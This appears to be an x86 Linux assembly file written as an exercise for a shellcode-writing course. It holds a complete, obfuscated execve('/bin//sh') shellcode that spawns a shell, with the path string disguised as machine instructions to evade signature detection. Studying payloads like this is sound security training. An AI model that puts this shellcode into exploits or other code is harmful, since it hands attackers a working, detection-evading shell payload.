; Filename: 	
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	Polymorphic variation for an obfuscated shellcode

global _start			

section .text

_start:
	; INIT Registers
	push byte 0xb
	pop eax
	xor ecx, ecx
	xor edx, edx

	jmp short shell

flow:	
	pop ebx
	int 0x80

shell: 	
	call dword flow
	das
	bound ebp,[ecx+0x6e]
	das
	das
	jae $+0x6a
